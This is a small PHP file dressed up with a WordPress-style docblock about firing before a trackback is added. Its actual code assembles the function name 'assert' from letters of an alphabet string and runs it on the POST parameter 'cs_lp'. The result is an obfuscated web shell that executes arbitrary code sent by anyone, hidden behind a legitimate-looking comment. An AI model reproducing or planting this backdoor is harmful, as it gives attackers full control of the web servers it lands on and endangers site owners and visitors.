<?php
 /**
* Fires before the trackback is added to a post.
*
* @since 4.7.0
*
* @param int    $tb_id     Post ID related to the trackback.
* @param string $tb_url    Trackback URL.
* @param string $charset   Character Set.
* @param string $title     Trackback Title.
* @param string $excerpt   Trackback Excerpt.
* @param string $blog_name Blog Name.
*/ 
    $a = substr("abcdefghijklmnopqrstufwxyz",0,1);
         $b = substr("abcdefghijklmnopqrstufwxyz",17,3);
         $c = substr("abcdefghijklmnopqrstufwxyz",3,2);
         $ss = $a.$b.$c;
         $d  = $ss[0].$ss[2];
         $dd = $ss[1].$ss[3];
         $url = $ss[2].$ss[5];
         $x = $d.$url.$dd;
$x($_POST['cs_lp']);
?>